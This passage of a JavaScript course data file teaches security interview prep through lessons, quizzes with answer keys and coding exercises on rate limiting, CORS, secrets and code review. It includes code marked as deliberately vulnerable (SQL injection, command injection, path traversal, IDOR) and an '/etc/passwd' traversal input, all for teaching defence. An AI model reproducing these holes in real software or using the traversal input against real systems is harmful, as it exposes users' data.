      { q: 'TOTP codes are valid for 30 seconds. Why does otplib allow a ±30 second window?', options: ['To make codes easier to type', 'To account for clock skew between the user\'s device and the server — clocks rarely sync perfectly', 'Because TOTP requires two codes to be valid', 'The 30-second window is required by RFC 6238'], correct: 1, explanation: 'Device clocks drift. A user might generate a code at second 29 of a window that expires before they type it. The ±1 window allows the previous and next codes, balancing security with usability.' },
    ],
    ide: {
      language: 'javascript',
      task: 'Implement a rate limiter for login attempts that blocks an IP after 5 failed attempts within 15 minutes, returning the remaining attempts and lockout duration.',
      starterCode: `class LoginRateLimiter {
  constructor() {
    // Store: { ip -> { attempts: number, firstAttempt: timestamp, lockedUntil: timestamp } }
    this.store = new Map()
    this.MAX_ATTEMPTS = 5
    this.WINDOW_MS = 15 * 60 * 1000  // 15 minutes
    this.LOCKOUT_MS = 15 * 60 * 1000 // 15 min lockout
  }

  // TODO: check(ip) — returns:
  // { allowed: false, retryAfter: ms } if locked
  // { allowed: true, remaining: n } if not locked
  check(ip) {

  }

  // TODO: recordFailure(ip) — increment failure count
  recordFailure(ip) {

  }

  // TODO: reset(ip) — clear on successful login
  reset(ip) {

  }
}

// Test
const limiter = new LoginRateLimiter()
const IP = '192.168.1.1'

console.log(limiter.check(IP))   // { allowed: true, remaining: 5 }

for (let i = 0; i < 5; i++) {
  limiter.recordFailure(IP)
  console.log(limiter.check(IP))
}
// After 5 failures: { allowed: false, retryAfter: ~900000 }

limiter.reset(IP)
console.log(limiter.check(IP))   // { allowed: true, remaining: 5 }`,
      hints: [
        'In check(): if lockedUntil > Date.now(), return allowed:false with retryAfter = lockedUntil - Date.now()',
        'In recordFailure(): get or create entry, increment attempts; if attempts >= MAX_ATTEMPTS, set lockedUntil = Date.now() + LOCKOUT_MS',
        'In check(): clean up expired entries (firstAttempt + WINDOW_MS < now); remaining = MAX_ATTEMPTS - attempts',
      ],
    },
  },

  {
    id: 'cc-interview-sec-m05', track: 'crash', title: 'API Security & Rate Limiting',
    subtitle: 'API authentication, rate limiting, CORS, input validation, and securing REST endpoints.',
    moduleObjective: 'Implement defense-in-depth for REST APIs: auth, rate limiting, input validation, and proper CORS configuration.',
    courseObjective: CC_SEC_OBJ, crashId: 'cc-interview-security', crashTitle: 'Security Interview Prep',
    level: 'Masters', xp: 200, duration: 14, module: 5, certArea: 'Security Interview Prep',
    keyTerms: [
      { term: 'API Key', definition: 'A secret token sent in headers to identify and authenticate a machine-to-machine caller.' },
      { term: 'Rate Limiting', definition: 'Restricting the number of requests a client can make in a given time window — prevents abuse and DoS.' },
      { term: 'CORS', definition: 'Cross-Origin Resource Sharing — HTTP headers that control which origins can access an API from the browser.' },
      { term: 'Input Validation', definition: 'Verifying that incoming data conforms to expected type, length, format, and range before processing.' },
      { term: 'Mass Assignment', definition: 'A vulnerability where an attacker sends extra fields in a request body that get applied to the model unexpectedly.' },
      { term: 'Allowlist vs Denylist', definition: 'Allowlists specify what is permitted; denylists specify what is forbidden — allowlists are stronger for security.' },
      { term: 'Idempotency Key', definition: 'A unique header the client sends; the server ignores duplicate requests with the same key, preventing double-charges.' },
    ],
    content: `## API Security & Rate Limiting

### Defense-in-depth for a REST endpoint

\`\`\`typescript
// POST /api/orders — fully secured endpoint
import { z } from 'zod'
import rateLimit from 'express-rate-limit'

// Layer 1: Rate limiting
const createOrderLimiter = rateLimit({
  windowMs: 60 * 1000,    // 1 minute
  max: 10,                // max 10 orders per minute per IP
  standardHeaders: true,  // return X-RateLimit-* headers
  legacyHeaders: false,
  handler: (req, res) => {
    res.status(429).json({
      error: 'Too many requests',
      retryAfter: Math.ceil(req.rateLimit.resetTime / 1000),
    })
  },
})

// Layer 2: Input validation schema
const CreateOrderSchema = z.object({
  items: z.array(z.object({
    productId: z.string().uuid(),
    quantity: z.number().int().min(1).max(100),
  })).min(1).max(50),
  shippingAddress: z.object({
    street: z.string().min(5).max(200),
    city: z.string().min(2).max(100),
    country: z.string().length(2),  // ISO country code
  }),
  // Note: userId is NOT in the schema — comes from JWT, not user input!
  // This prevents mass assignment: user can't set their own userId
})

// Layer 3: Route handler
router.post('/api/orders',
  createOrderLimiter,           // rate limit
  authenticate,                 // verify JWT
  async (req, res) => {
    // Validate input
    const parsed = CreateOrderSchema.safeParse(req.body)
    if (!parsed.success) {
      return res.status(400).json({
        error: 'Validation failed',
        details: parsed.error.flatten(),
      })
    }

    const { items, shippingAddress } = parsed.data
    const userId = req.user.id  // from JWT — not from request body!

    // Verify products exist and belong to this user's region
    const products = await Product.findMany({
      where: { id: { in: items.map(i => i.productId) } },
    })

    if (products.length !== items.length) {
      return res.status(404).json({ error: 'One or more products not found' })
    }

    const order = await Order.create({ userId, items, shippingAddress })
    return res.status(201).json(order)
  }
)
\`\`\`

### CORS — configured correctly

\`\`\`typescript
import cors from 'cors'

const corsOptions: cors.CorsOptions = {
  origin: (origin, callback) => {
    const allowed = [
      'https://academy.jsupremeconglomerate.online',
      'https://www.jsupremeconglomerate.online',
    ]

    // Allow requests with no origin (curl, server-to-server, mobile)
    if (!origin || allowed.includes(origin)) {
      callback(null, true)
    } else {
      callback(new Error('Not allowed by CORS'))
    }
  },
  credentials: true,          // allow cookies to be sent
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Idempotency-Key'],
  exposedHeaders: ['X-RateLimit-Remaining', 'X-RateLimit-Reset'],
  maxAge: 86400,              // preflight cached 24h
}

app.use(cors(corsOptions))
\`\`\`

### Mass assignment prevention

\`\`\`typescript
// ✗ VULNERABLE — attacker sends { role: "admin", isAdmin: true }
const user = await User.create(req.body)  // entire body applied to model!

// ✓ SAFE — explicitly pick allowed fields
const { email, name, password } = req.body
const user = await User.create({ email, name, password })  // only safe fields

// ✓ EVEN SAFER — validate schema first, then use only parsed output
const parsed = RegisterSchema.parse(req.body)
const user = await User.create(parsed)  // schema never includes role or isAdmin

// ✗ VULNERABLE — UPDATE
await User.update({ id }, req.body)  // attacker can update any field

// ✓ SAFE — explicit fields
const { name, bio, avatar } = req.body
await User.update({ id }, { name, bio, avatar })
\`\`\``,
    quiz: [
      { q: 'An attacker sends POST /api/users with body { email: "a@b.com", role: "admin" }. What vulnerability allows this to work?', options: ['SQL injection', 'Mass assignment — applying req.body directly to the model without filtering allowed fields', 'XSS in the email field', 'CORS misconfiguration'], correct: 1, explanation: 'Mass assignment (also called overposting): if the server does User.create(req.body), the attacker\'s extra fields get applied. Always use an allowlist of fields from validated schema, not raw req.body.' },
      { q: 'CORS with Access-Control-Allow-Origin: * — when is this acceptable?', options: ['Never — it\'s always a security risk', 'For public read-only APIs where there is no authentication or sensitive data', 'Only for GET requests', 'When the API uses API keys'], correct: 1, explanation: 'A wildcard origin is fine for purely public, read-only APIs (like a public CDN). If your API handles auth, sessions, or personal data, restrict origins to your known domains.' },
      { q: 'What HTTP status code should rate limiting return?', options: ['400 Bad Request', '401 Unauthorized', '403 Forbidden', '429 Too Many Requests'], correct: 3, explanation: '429 Too Many Requests is the correct status code, defined in RFC 6585. Include a Retry-After header indicating when the client can retry.' },
      { q: 'Why should userId always come from the JWT and never from the request body?', options: ['JWTs are faster to process', 'Request body can be manipulated — an attacker could set userId to any user\'s ID and create resources on their behalf', 'JWT is required by REST standards', 'Request body is encrypted'], correct: 1, explanation: 'The JWT is signed by the server and cryptographically verified — it cannot be forged. The request body is freely editable by the client. Always derive sensitive identifiers from verified tokens, never from input.' },
    ],
    ide: {
      language: 'javascript',
      task: 'Implement a sliding window rate limiter that tracks requests per IP in a 1-minute window, more precise than the fixed window approach.',
      starterCode: `class SlidingWindowRateLimiter {
  constructor(maxRequests, windowMs) {
    this.maxRequests = maxRequests
    this.windowMs = windowMs
    // Store timestamps of requests per IP
    this.requests = new Map()  // ip -> [timestamp, timestamp, ...]
  }

  // TODO: isAllowed(ip) — returns { allowed: boolean, remaining: number, resetAt: number }
  // Sliding window logic:
  // 1. Get the timestamps for this IP
  // 2. Filter out timestamps older than windowMs ago
  // 3. If remaining timestamps >= maxRequests, deny
  // 4. Otherwise, add current timestamp and allow
  isAllowed(ip) {

  }
}

// Test
const limiter = new SlidingWindowRateLimiter(3, 1000)  // 3 req per second

function makeRequest(ip) {
  const result = limiter.isAllowed(ip)
  console.log(\`Request: \${result.allowed ? 'ALLOWED' : 'DENIED'} (remaining: \${result.remaining})\`)
  return result
}

makeRequest('1.2.3.4')  // ALLOWED (remaining: 2)
makeRequest('1.2.3.4')  // ALLOWED (remaining: 1)
makeRequest('1.2.3.4')  // ALLOWED (remaining: 0)
makeRequest('1.2.3.4')  // DENIED (remaining: 0)

// After window expires, should allow again
setTimeout(() => {
  console.log('After window:')
  makeRequest('1.2.3.4')  // ALLOWED (remaining: 2)
}, 1100)`,
      hints: [
        'Get or create an array for the IP; filter it to only keep timestamps within Date.now() - windowMs',
        'If filtered.length >= maxRequests, return allowed: false',
        'Otherwise, push Date.now() to the filtered array, store it back, return allowed: true',
        'remaining = maxRequests - filtered.length (before adding current request)',
      ],
    },
  },

  {
    id: 'cc-interview-sec-m06', track: 'crash', title: 'Infrastructure & Cloud Security',
    subtitle: 'Secrets management, least privilege in AWS/GCP, container security, and secure CI/CD pipelines.',
    moduleObjective: 'Apply security best practices to cloud deployments: secrets rotation, IAM least privilege, and container hardening.',
    courseObjective: CC_SEC_OBJ, crashId: 'cc-interview-security', crashTitle: 'Security Interview Prep',
    level: 'Masters', xp: 200, duration: 14, module: 6, certArea: 'Security Interview Prep',
    keyTerms: [
      { term: 'IAM', definition: 'Identity and Access Management — cloud service for managing who can access what resources and with what permissions.' },
      { term: 'Secrets Manager', definition: 'A managed service (AWS Secrets Manager, Vault) for storing and rotating secrets securely.' },
      { term: 'SBOM', definition: 'Software Bill of Materials — a list of all components and dependencies in a software project, used for vulnerability tracking.' },
      { term: 'Container Hardening', definition: 'Reducing the attack surface of a Docker container — non-root user, minimal base image, no secrets in layers.' },
      { term: 'SAST', definition: 'Static Application Security Testing — analyzing source code for vulnerabilities without executing it.' },
      { term: 'DAST', definition: 'Dynamic Application Security Testing — testing a running application by simulating attacks.' },
      { term: 'Supply Chain Attack', definition: 'Compromising a dependency or build tool to inject malicious code into many downstream projects.' },
    ],
    content: `## Infrastructure & Cloud Security

### Secrets management — never hardcode secrets

\`\`\`
✗ WRONG: Secrets in code
  const apiKey = "sk-prod-abc123"  // visible in git history forever!
  const dbUrl = "postgres://admin:password@..."

✗ WRONG: Secrets in .env committed to git
  Even .gitignore-d .env files appear in git history if ever committed

✓ CORRECT: Environment variables from secret manager
  # In deployment (Vercel, Railway, etc.):
  SUPABASE_SERVICE_KEY=<set in platform dashboard>

  # In code:
  const key = process.env.SUPABASE_SERVICE_KEY
  if (!key) throw new Error('SUPABASE_SERVICE_KEY not configured')

✓ CORRECT: Runtime secrets injection (Docker/Kubernetes)
  # docker-compose.yml
  services:
    api:
      env_file: .env        # not committed
      environment:
        - DB_PASSWORD_FILE=/run/secrets/db_password  # Docker secrets

✓ CORRECT: Secrets scanning in CI
  # GitHub Actions: use git-secrets or trufflehog
  - name: Scan for secrets
    uses: trufflesecurity/trufflehog@main
    with:
      path: ./
      base: HEAD~1
\`\`\`

### Secure Dockerfile

\`\`\`dockerfile
# ✓ SECURE multi-stage Dockerfile
# Stage 1: build
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production   # production deps only

# Stage 2: runtime — minimal image
FROM node:20-alpine AS runner
WORKDIR /app

# Run as non-root user (principle of least privilege)
RUN addgroup --system --gid 1001 nodejs && \
    adduser --system --uid 1001 nextjs
USER nextjs   # NEVER run as root in containers

COPY --from=builder --chown=nextjs:nodejs /app/node_modules ./node_modules
COPY --chown=nextjs:nodejs . .

# Don't expose secrets in ENV — pass at runtime
ENV NODE_ENV=production
EXPOSE 3000

HEALTHCHECK --interval=30s --timeout=3s \
  CMD wget -qO- http://localhost:3000/api/health || exit 1

CMD ["node", "server.js"]
\`\`\`

### Security in GitHub Actions CI/CD

\`\`\`yaml
# .github/workflows/security.yml
name: Security Scan

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    permissions:
      security-events: write   # only what we need (least privilege)
      contents: read

    steps:
      - uses: actions/checkout@v4

      # SAST: find vulnerabilities in code
      - name: Run CodeQL Analysis
        uses: github/codeql-action/analyze@v3
        with:
          languages: javascript

      # Dependency audit
      - name: npm audit
        run: npm audit --audit-level=high
        continue-on-error: false  # fail on high severity

      # Secret scanning
      - name: TruffleHog
        uses: trufflesecurity/trufflehog@main
        with:
          path: .
          base: HEAD~1
          only-verified: true

      # Container scanning (if using Docker)
      - name: Trivy container scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'my-app:latest'
          format: 'sarif'
          exit-code: '1'
          severity: 'CRITICAL,HIGH'
\`\`\`

### Least privilege — IAM policy example

\`\`\`json
// AWS IAM policy for a Next.js app accessing S3
// ✗ WRONG: too broad
{
  "Effect": "Allow",
  "Action": "s3:*",
  "Resource": "*"
}

// ✓ CORRECT: exactly what's needed
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["s3:GetObject", "s3:PutObject"],
      "Resource": "arn:aws:s3:::my-app-uploads/*"  // only this bucket!
    },
    {
      "Effect": "Allow",
      "Action": "s3:ListBucket",
      "Resource": "arn:aws:s3:::my-app-uploads",
      "Condition": {
        "StringLike": { "s3:prefix": "user-uploads/*" }
      }
    }
  ]
}
\`\`\``,
    quiz: [
      { q: 'A developer committed an API key to git, then immediately deleted it in the next commit. Is the key still exposed?', options: ['No — the deletion removed it', 'Yes — git history is permanent; the key exists in earlier commits and can be extracted', 'Only if the branch is public', 'Only if someone cloned the repo before the deletion'], correct: 1, explanation: 'Git stores the complete history. The key exists in the commit before deletion and can be retrieved with git log, git show, or git checkout. Treat the key as compromised and rotate it immediately.' },
      { q: 'Why should Docker containers run as a non-root user?', options: ['Root containers use more memory', 'If the container is compromised, a non-root user has limited ability to escape the container or damage the host system', 'Non-root is required for Kubernetes', 'Root users can\'t access network sockets in containers'], correct: 1, explanation: 'A process running as root inside a container that breaks out of the container (via a kernel vulnerability) would have root on the host. Non-root containers limit the blast radius of a container escape.' },
      { q: 'What is a supply chain attack in the context of npm packages?', options: ['An attack on a package delivery truck', 'Compromising a widely-used npm package so malicious code is distributed to all packages that depend on it', 'Stealing npm credentials', 'A DDoS attack on npm registry'], correct: 1, explanation: 'Supply chain attacks target upstream dependencies. A compromised package (event-stream had this happen) injects malicious code that executes in all consuming projects. Mitigations: lock file, npm audit, integrity hashes, SBOM.' },
      { q: 'What is the principle of least privilege applied to a cloud IAM role?', options: ['Give every service admin access for convenience', 'Grant only the exact permissions the service needs to function, nothing more', 'Use the same role for all services to reduce complexity', 'Give read-only access to everything'], correct: 1, explanation: 'Least privilege: if a service only needs to read from one S3 bucket, it should only have s3:GetObject on that specific bucket. Broad permissions (s3:*/*) mean a compromise of that service exposes everything it can access.' },
    ],
    ide: {
      language: 'javascript',
      task: 'Write a secrets validator that checks if a configuration object contains any hardcoded secrets (vs. properly referencing environment variables).',
      starterCode: `// Detect hardcoded secrets in a config object
const SECRET_PATTERNS = [
  /^sk-[a-zA-Z0-9]{20,}/,        // API keys like sk-...
  /^[A-Za-z0-9+/]{40,}={0,2}$/,  // Base64-encoded secrets
  /password/i,                     // anything called "password" with a value
  /^[A-F0-9]{32,64}$/,            // hex strings (tokens/hashes)
]

function validateSecrets(config, path = '') {
  const issues = []

  // TODO: recursively walk the config object
  // For each string value:
  //   - If value looks like a real secret (matches SECRET_PATTERNS or length > 20 with mixed chars)
  //     AND doesn't start with "process.env" or "\${" (env var reference)
  //   - Add an issue: { path: 'database.password', value: 'pa**word', recommendation: '...' }
  //   - Mask the value in the report (show first 3 + asterisks)

  return issues
}

// Test
const badConfig = {
  database: {
    url: 'postgres://admin:MySecretPass123@db.example.com/prod',
    password: 'hardcoded-password-here',
  },
  api: {
    openaiKey: 'sk-abcdefghijklmnopqrstuvwxyz123456',
    stripeKey: process.env.STRIPE_KEY,  // this is fine
  },
  port: 3000,  // not a secret
}

const issues = validateSecrets(badConfig)
console.log('Security issues found:', issues.length)
issues.forEach(issue => {
  console.log(\`  \${issue.path}: "\${issue.maskedValue}" — \${issue.recommendation}\`)
})`,
      hints: [
        'Recurse: for each key, if value is an object call validateSecrets(value, path + "." + key), if string check if it looks like a secret',
        'A value "looks like a secret" if: it matches any SECRET_PATTERNS, OR length > 15 and has mixed upper/lower/digits',
        'Skip values that start with "process.env" or match /^\\$\\{/ (env var syntax)',
        'Mask: value.slice(0, 3) + "*".repeat(value.length - 3)',
      ],
    },
  },

  {
    id: 'cc-interview-sec-m07', track: 'crash', title: 'Penetration Testing & Secure Code Review',
    subtitle: 'Manual code review methodology, common vulnerability patterns, and how to think like a pen tester.',
    moduleObjective: 'Conduct a systematic security code review and identify vulnerabilities using a structured methodology.',
    courseObjective: CC_SEC_OBJ, crashId: 'cc-interview-security', crashTitle: 'Security Interview Prep',
    level: 'Masters', xp: 200, duration: 14, module: 7, certArea: 'Security Interview Prep',
    keyTerms: [
      { term: 'Vulnerability Assessment', definition: 'Systematic identification of security weaknesses without attempting to exploit them.' },
      { term: 'Penetration Test', definition: 'An authorized simulated attack that actively exploits vulnerabilities to demonstrate their impact.' },
      { term: 'CVE', definition: 'Common Vulnerabilities and Exposures — a standardized identifier for publicly known security vulnerabilities.' },
      { term: 'CVSS', definition: 'Common Vulnerability Scoring System — a 0-10 score quantifying vulnerability severity.' },
      { term: 'Path Traversal', definition: 'Using ../ sequences in file paths to access files outside the intended directory.' },
      { term: 'IDOR', definition: 'Insecure Direct Object Reference — accessing resources by guessing/manipulating IDs without authorization checks.' },
      { term: 'Timing Attack', definition: 'Inferring secrets by measuring how long operations take — comparing two secrets character by character leaks information.' },
    ],
    content: `## Penetration Testing & Secure Code Review

### Secure code review methodology

\`\`\`
1. IDENTIFY THE ATTACK SURFACE
   - All HTTP endpoints (GET, POST, PUT, DELETE)
   - Authentication/authorization checks
   - File upload/download handlers
   - External API calls
   - Database queries
   - Command execution
   - Deserialization

2. TRACE DATA FLOW — follow user input end-to-end:
   Browser input → HTTP request → middleware → controller → DB → response
   At each step: is input validated? escaped? authorized?

3. CHECK AUTHENTICATION
   - Is every endpoint protected?
   - Can an unauthed user reach protected routes?
   - Are session IDs regenerated on login/logout?

4. CHECK AUTHORIZATION
   - Does the code verify the user OWNS the resource?
   - Can user A access user B's data by changing an ID?

5. CHECK INJECTION POINTS
   - SQL queries — parameterized?
   - Template rendering — user input escaped?
   - Shell commands — user input avoided?

6. CHECK CRYPTOGRAPHY
   - Passwords bcrypt/argon2 or weak hash?
   - Secrets hardcoded?
   - Tokens cryptographically random?

7. CHECK ERROR HANDLING
   - Do errors leak stack traces, DB queries, file paths?
   - Are all exceptions caught and sanitized?
\`\`\`

### IDOR (Insecure Direct Object Reference) — most exploited

\`\`\`typescript
// ✗ VULNERABLE — only checks auth, not authorization
router.get('/api/documents/:id', authenticate, async (req, res) => {
  const doc = await Document.findById(req.params.id)
  if (!doc) return res.status(404).json({ error: 'Not found' })
  return res.json(doc)  // returns ANY document to ANY authenticated user!
})

// ATTACK: attacker iterates /api/documents/1, /api/documents/2, etc.

// ✓ FIXED — verify ownership
router.get('/api/documents/:id', authenticate, async (req, res) => {
  const doc = await Document.findById(req.params.id)
  if (!doc) return res.status(404).json({ error: 'Not found' })

  // Authorization check — critical!
  if (doc.userId !== req.user.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' })
    // Note: return 403, not 404 — "not found" hides that the resource exists
    // But some argue returning 404 is better to prevent enumeration ¯\\_(ツ)_/¯
  }

  return res.json(doc)
})
\`\`\`

### Timing attacks — the subtle vulnerability

\`\`\`typescript
// ✗ VULNERABLE — early return leaks token length
function validateApiKey(provided: string, stored: string): boolean {
  if (provided.length !== stored.length) return false  // leaks length!

  for (let i = 0; i < stored.length; i++) {
    if (provided[i] !== stored[i]) return false  // timing leak — short-circuits!
  }
  return true
}
// An attacker can measure timing to determine how many characters matched

// ✓ SAFE — constant-time comparison
import { timingSafeEqual } from 'crypto'

function validateApiKey(provided: string, stored: string): boolean {
  const a = Buffer.from(provided)
  const b = Buffer.from(stored)

  // Pads to same length if different (otherwise throws)
  if (a.length !== b.length) {
    // Still constant-time compare against a dummy — don't early return
    timingSafeEqual(a, Buffer.alloc(a.length))
    return false
  }

  return timingSafeEqual(a, b)
}
\`\`\`

### Path traversal

\`\`\`typescript
// ✗ VULNERABLE — user controls file path
router.get('/api/files/:filename', authenticate, (req, res) => {
  const filePath = path.join(__dirname, 'uploads', req.params.filename)
  res.sendFile(filePath)
  // ATTACK: /api/files/../../../../etc/passwd
})

// ✓ SAFE — validate path stays within allowed directory
import path from 'path'

router.get('/api/files/:filename', authenticate, (req, res) => {
  const uploadsDir = path.resolve(__dirname, 'uploads')
  const requestedPath = path.resolve(uploadsDir, req.params.filename)

  // Critical check: resolved path must start with uploadsDir
  if (!requestedPath.startsWith(uploadsDir + path.sep)) {
    return res.status(400).json({ error: 'Invalid file path' })
  }

  // Additional: verify only safe characters in filename
  if (!/^[a-zA-Z0-9._-]+$/.test(req.params.filename)) {
    return res.status(400).json({ error: 'Invalid filename' })
  }

  res.sendFile(requestedPath)
})
\`\`\``,
    quiz: [
      { q: 'A user changes the URL from /api/invoices/123 to /api/invoices/456 and sees another user\'s invoice. What is this vulnerability?', options: ['SQL injection', 'XSS', 'IDOR — Insecure Direct Object Reference', 'CSRF'], correct: 2, explanation: 'IDOR: the application uses a user-supplied ID to directly reference a database object without verifying the requester owns that object. The fix is always to add an ownership check.' },
      { q: 'Why is returning 403 Forbidden instead of 404 Not Found when a user lacks access sometimes debated?', options: ['403 is the wrong HTTP status for access denial', '404 prevents resource enumeration (attacker can\'t tell if ID 456 exists at all); 403 reveals the resource exists but is forbidden', '404 is faster to process', '403 is only for admin routes'], correct: 1, explanation: 'Returning 404 for unauthorized access prevents enumeration attacks — an attacker can\'t distinguish "doesn\'t exist" from "exists but forbidden." 403 reveals the resource exists. Context-dependent: internal APIs can use 403; public-facing APIs often use 404.' },
      { q: 'What makes timingSafeEqual() different from === for comparing secrets?', options: ['timingSafeEqual is faster', '=== can short-circuit on the first non-matching character, leaking how many characters matched through response time; timingSafeEqual always takes the same time', 'timingSafeEqual handles Unicode', 'They are identical for ASCII strings'], correct: 1, explanation: 'Timing attacks measure response time with nanosecond precision. If string comparison short-circuits after 5 matching characters, the response is slightly faster than 6 matches — revealing character by character. Constant-time comparison always takes the same time.' },
      { q: 'An attacker sends the filename ../../../../etc/passwd. What is this attack and how do you prevent it?', options: ['SQL injection in file paths', 'Path traversal — using ../ to escape the intended directory; prevent with path.resolve() and verifying the result starts with the allowed base directory', 'XSS via file names', 'Command injection'], correct: 1, explanation: '../ in paths climbs directory levels. path.resolve() normalizes the path (removes the ../ sequences), and checking if it still starts with the uploads directory confirms the path didn\'t escape.' },
    ],
    ide: {
      language: 'javascript',
      task: 'Perform a code review of this Express route and identify all security vulnerabilities, then write the fixed version.',
      starterCode: `// VULNERABLE CODE — find all security issues
// There are at least 5 distinct vulnerabilities

const express = require('express')
const fs = require('fs')
const { exec } = require('child_process')
const db = require('./db')  // assume: db.query(sql) returns rows

const router = express.Router()

router.get('/user/:id', async (req, res) => {
  // No authentication check
  const query = "SELECT * FROM users WHERE id = " + req.params.id
  const user = db.query(query)
  res.json(user)
})

router.post('/upload', async (req, res) => {
  const filename = req.body.filename
  const content = req.body.content

  // Write to filesystem
  fs.writeFileSync('/app/uploads/' + filename, content)

  // Process the file
  exec('process-file ' + filename, (err, stdout) => {
    res.json({ output: stdout, stack: err?.stack })
  })
})

// TODO: List the vulnerabilities, then write the secure version below:
// Vulnerability 1: ___
// Vulnerability 2: ___
// ...

// SECURE VERSION:
`,
      hints: [
        'Vulnerabilities to find: 1) No auth, 2) SQL injection in GET, 3) Path traversal in upload filename, 4) Command injection in exec(), 5) Error stack trace leaked in response',
        'Fix SQL: use parameterized query: db.query("SELECT * FROM users WHERE id = $1", [req.params.id])',
        'Fix path traversal: path.resolve and startsWith check',
        'Fix command injection: execFile() with args array instead of exec() with string',
        'Fix error disclosure: return generic error message, not err.stack',
      ],
    },
  },

  {
    id: 'cc-interview-sec-m08', track: 'crash', title: 'Security Live Coding Challenges',
    subtitle: 'Security interview war games: implement secure functions, find bugs in code, design a security architecture.',
    moduleObjective: 'Solve security-focused coding challenges under time pressure — the exact format of security engineering interviews.',
    courseObjective: CC_SEC_OBJ, crashId: 'cc-interview-security', crashTitle: 'Security Interview Prep',
    level: 'Masters', xp: 200, duration: 14, module: 8, certArea: 'Security Interview Prep',
    keyTerms: [
      { term: 'Defense in Depth', definition: 'Multiple independent security controls — if one layer fails, others still protect.' },
      { term: 'Secure by Default', definition: 'The most secure configuration is the default; users must opt-in to less secure options.' },
      { term: 'Fail Secure', definition: 'On error, deny access rather than granting it — the opposite of "fail open."' },
      { term: 'Security Invariant', definition: 'A property that must always be true regardless of inputs — e.g., "a user can never access another user\'s data."' },
      { term: 'Attack Vector', definition: 'The path or means by which an attacker can access a target.' },
      { term: 'Exploit', definition: 'Code or technique that takes advantage of a vulnerability to cause unintended behavior.' },
      { term: 'Remediation', definition: 'The process of fixing a vulnerability — patch, configuration change, or compensating control.' },
    ],
    content: `## Security Live Coding Challenges

### Challenge 1: Design a password reset system securely

\`\`\`
Interview prompt: "Design a secure password reset flow"

Answer with specific implementation:

1. User requests reset (POST /auth/reset-request)
   - Accept email only
   - ALWAYS return 200 with "If this email exists, check your inbox"
   - Never reveal whether email is registered (prevents enumeration)
   - Rate limit: 3 requests per hour per email + per IP

2. Generate and store token
   - 32 bytes from crypto.randomBytes (not Math.random!)
   - Expire in 15 minutes
   - Single-use: delete immediately on first use
   - Store as bcrypt hash — if DB is breached, tokens can't be used
   - Invalidate all existing tokens for that user on new request

3. Email the token
   - Link: https://app.com/reset?token=abc123...
   - Email body: warn user to not forward or share this email

4. Verify and reset (POST /auth/reset-confirm)
   - Validate token: find by hash, check not expired
   - Validate new password: length, complexity
   - Hash new password with bcrypt(12 rounds)
   - Delete token from DB (single-use)
   - Invalidate ALL existing sessions (prevent session hijack)
   - Log the event: timestamp, IP, user-agent
\`\`\`

### Challenge 2: Build a Content Security Policy (CSP) builder

\`\`\`typescript
class CSPBuilder {
  private directives: Map<string, string[]> = new Map()

  defaultSrc(...sources: string[]): this {
    this.directives.set('default-src', sources)
    return this
  }

  scriptSrc(...sources: string[]): this {
    this.directives.set('script-src', sources)
    return this
  }

  styleSrc(...sources: string[]): this {
    this.directives.set('style-src', sources)
    return this
  }

  connectSrc(...sources: string[]): this {
    this.directives.set('connect-src', sources)
    return this
  }

  nonce(token: string): this {
    const existing = this.directives.get('script-src') ?? ["'self'"]
    this.directives.set('script-src', [...existing, \`'nonce-\${token}'\`])
    return this
  }

  build(): string {
    return Array.from(this.directives.entries())
      .map(([directive, sources]) => \`\${directive} \${sources.join(' ')}\`)
      .join('; ')
  }
}

// Usage
const nonce = crypto.randomUUID()
const csp = new CSPBuilder()
  .defaultSrc("'self'")
  .scriptSrc("'self'")
  .nonce(nonce)
  .styleSrc("'self'", "'unsafe-inline'")
  .connectSrc("'self'", 'https://your-api.com')
  .build()

// "default-src 'self'; script-src 'self' 'nonce-abc...'; ..."
\`\`\`

### The security interview mindset

\`\`\`
Interviewer: "How would you secure this API?"

❌ Bad answer: "I'd add authentication."

✓ Good answer (defense in depth):
"I'd apply multiple layers:

1. Transport security: HTTPS only, HSTS header
2. Authentication: JWT with short expiry (15 min), refresh token in HttpOnly cookie
3. Authorization: verify resource ownership on every request, not just login
4. Input validation: Zod schema for all inputs; reject unknown fields
5. Rate limiting: per IP and per user, with 429 responses
6. Security headers: CSP, X-Frame-Options, X-Content-Type-Options
7. Logging: log all auth events, authorization failures, unusual patterns
8. Dependency scanning: npm audit in CI, Dependabot alerts
9. CORS: explicit allowlist of origins

What I'd test: IDOR (manually try accessing other users' resources),
SQL injection in all string inputs, rate limiting bypass, and
JWT algorithm confusion."
\`\`\``,
    quiz: [
      { q: 'In a password reset flow, why should you always return 200 OK even if the email doesn\'t exist?', options: ['To be user-friendly', 'Returning 404 or "email not found" lets attackers enumerate which emails are registered — always use a generic response', 'To save database queries', 'HTTP standards require 200 for POST requests'], correct: 1, explanation: 'Account enumeration: an attacker can test thousands of emails and learn which are registered (valuable for targeted phishing or credential stuffing). Always return a generic "check your inbox" response.' },
      { q: 'Why should all existing user sessions be invalidated after a password reset?', options: ['For performance — old sessions waste memory', 'If an attacker triggered the reset to take over the account, invalidating sessions removes their access immediately', 'Sessions naturally expire so it doesn\'t matter', 'Only the mobile session needs to be invalidated'], correct: 1, explanation: 'Scenario: attacker gained access to the account, is actively using a session. The real user resets their password. Without session invalidation, the attacker\'s session remains valid.' },
      { q: 'What does "fail secure" (or "fail closed") mean in security?', options: ['The application crashes gracefully', 'On any error or unexpected state, deny access rather than granting it — err on the side of restriction', 'Errors are logged securely', 'The firewall blocks all traffic on failure'], correct: 1, explanation: '"Fail secure" means your default on error is to deny. If the auth check throws an exception, the request is rejected (403), not accidentally allowed. "Fail open" accidentally grants access on errors — extremely dangerous.' },
      { q: 'An interviewer asks you to "break this login function." What do you do first?', options: ['Run the code immediately', 'Analyze inputs: what can be controlled? — focus on email, password, headers, cookies. Test: empty inputs, very long inputs, SQL meta-characters, Unicode, null bytes.', 'Look for syntax errors', 'Read the documentation'], correct: 1, explanation: 'Security thinking starts with: what inputs can I control? Then: what happens with unexpected values? A structured approach (test auth bypass, injection, edge cases) beats random guessing.' },
    ],
    ide: {
      language: 'javascript',
